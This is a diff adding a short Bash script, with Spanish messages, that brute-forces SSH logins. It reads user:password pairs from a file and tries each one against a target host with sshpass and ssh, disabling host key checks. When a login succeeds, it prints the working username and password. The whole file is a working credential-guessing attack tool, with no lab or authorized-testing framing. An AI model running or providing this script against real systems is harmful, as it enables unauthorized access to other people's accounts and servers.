@@ -1,0 +1,48 @@
+#!/bin/bash
+
+TARGET=$1
+CREDENTIALS_FILE=$2
+PORT=${3:-22}
+
+# Validación
+if [ -z "$TARGET" ] || [ -z "$CREDENTIALS_FILE" ]; then
+    echo "Error: Uso: $0 <target> <credentials_file> [port]" >&2
+    exit 1
+fi
+
+if [ ! -f "$CREDENTIALS_FILE" ]; then
+    echo "Error: Archivo '$CREDENTIALS_FILE' no encontrado" >&2
+    exit 1
+fi
+
+echo "🔐 Iniciando SSH bruteforce"
+echo "🎯 Target: $TARGET:$PORT"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+SUCCESS=false
+
+while IFS=':' read -r USER PASSWORD; do
+    [[ -z "$USER" || "$USER" =~ ^# ]] && continue
+    
+    USER=$(echo "$USER" | xargs)
+    PASSWORD=$(echo "$PASSWORD" | xargs)
+    
+    echo "🔑 Probando: $USER"
+    
+    if sshpass -p "$PASSWORD" ssh -p "$PORT" -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$TARGET" "exit" 2>/dev/null; then
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "✅ CREDENCIALES VÁLIDAS:"
+        echo "   Usuario: $USER"
+        echo "   Password: $PASSWORD"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        SUCCESS=true
+        break
+    fi
+done < "$CREDENTIALS_FILE"
+
+if [ "$SUCCESS" = false ]; then
+    echo "❌ No se encontraron credenciales válidas"
+    exit 1
+fi
+
+exit 0
